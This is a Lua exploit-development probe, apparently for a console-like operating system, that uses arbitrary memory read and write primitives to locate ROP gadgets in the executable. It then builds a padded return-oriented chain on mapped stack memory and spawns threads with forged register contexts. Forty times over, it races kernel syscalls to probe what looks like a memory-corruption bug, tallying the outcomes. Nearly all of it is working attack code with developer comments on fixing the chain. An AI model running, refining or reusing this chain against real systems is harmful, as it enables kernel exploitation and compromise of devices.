-- CRASH_CLASS: HIGH
-- PROBE 883b: the padded chain, straight-line (no loop reset).  The last version clobbered its own loop head because
-- the loader stub's frame grew down from RSP into the chain.  Fix: pad the chain 0x400 bytes
-- between the argument setup and the call, so the frame at the moment of the call cannot
-- reach the head, and call through a `call rax` gadget instead of a chain word.
print("=== PROBE 883b: padded chain, one delete then thr_exit ===")
local ROUNDS=40
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rsp=find_pat(ebase,0x494000,string.char(0x5C,0xC3))
local call_rax=find_pat(ebase,0x494000,string.char(0xFF,0xD0))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] eboot=%08X poprsp=%s callrax=%s", ebase, tostring(pop_rsp), tostring(call_rax)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rsp and call_rax and jmp_g) then print("[0] gadget missing") return end
local page=0x4000; local STACK=page*8
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RAX=0x078}
local D=mmap(page); local idsLo=mmap(page); local idsHi=mmap(page); local stA=mmap(page); local stB=mmap(page)
local out=mmap(page); local res=mmap(page)
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local sc669,sc662,sc664=mk(669),mk(662),mk(664)
local fds=memory.alloc(8); local a=-1
for try=1,5 do
    wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
    local ok,rv=pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(fds)) end)
    if ok and to_num(rv)==0 then a=rd(fds); break end
end
print(string.format("[A] control fd=%d", a))
local function spinner(idsPg,stPg)
    local block=mmap(STACK)
    if block==0 then print("[!] mmap failed"); return false end
    local start=block+STACK-0x800          -- head sits 0x800 below the call site
    wq(start,uint64(pop_rdi))              -- word the final ret pops
    local ch={pop_rdi,idsPg,pop_rsi,1,pop_rdx,stPg,pop_rax,662}
    for i=1,#ch do wq(start+i*8,uint64(ch[i])) end
    local pad=64                            -- 64 * 16 bytes = 0x400 of dead pops
    for p=1,pad do wq(start+8+8*(#ch)+(p-1)*16,uint64(pop_rdi)); wq(start+8+8*(#ch)+(p-1)*16+8,uint64(0)) end
    local at=start+8+8*#ch+pad*16      -- RSP after the pops, not the end of the last word
    wq(at,uint64(fn))
    wq(at+8,uint64(pop_rdi)); wq(at+16,uint64(0)); wq(at+24,uint64(pop_rax)); wq(at+32,uint64(431)); wq(at+40,uint64(fn)); wq(at+48,uint64(jmp_g))
    print(string.format("[E] spinner block=%08X head=%08X call=%08X", block, start, at))
    local ctx=memory.alloc(0x500); zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start+8))
    wq(ctx+Ctx.RDI,uint64(idsPg)); wq(ctx+Ctx.RSI,uint64(1)); wq(ctx+Ctx.RDX,uint64(stPg)); wq(ctx+Ctx.RAX,uint64(662))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return (ok and to_num(rv)==0)
end
wq(idsLo,uint64(0xFFFF)); wq(idsHi,uint64(0xFFFF))
print("[B] straight-line child armed")
local rounds,gone,gated,other=0,0,0,0
for r=1,ROUNDS do
    rounds=r
    wq(D+0x00,uint64(0)); wq(D+0x08,uint64(0)); wq(D+0x10,uint64(res)); wq(D+0x18,uint64(res)); wd(D+0x20,-1); wd(D+0x24,0)
    wd(out,0); wd(res,0); wd(stA,0); wd(stB,0)
    local okc=pcall(function() sc669(uint64(0x1001),uint64(D),uint64(2),uint64(1),uint64(out)) end)
    local id=rd(out) or 0
    if id==0 or not okc then break end
    wd(res,id)
    pcall(function() sc662(uint64(res),uint64(1),uint64(stA)) end)   -- serial: [T+2] -> 1
    local hi=id+0x10000
    wd(stA,0)
    wq(idsLo,uint64(hi))
    local okc2=spinner(idsLo,stA)
    sleep_ms(3)
    local va=rd(stA) or 0
    if va==0 then gone=gone+1 elseif va==0x80020010 then gated=gated+1 else other=other+1 end
    if not okc2 then print("[!] spawn failed at round "..r) break end
    if r%10==0 then print(string.format("[C] r=%d gone=%d gated=%d other=%d", r, gone, gated, other)) end
end
print(string.format("[D] rounds=%d gone=%d gated=%d other=%d", rounds, gone, gated, other))
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
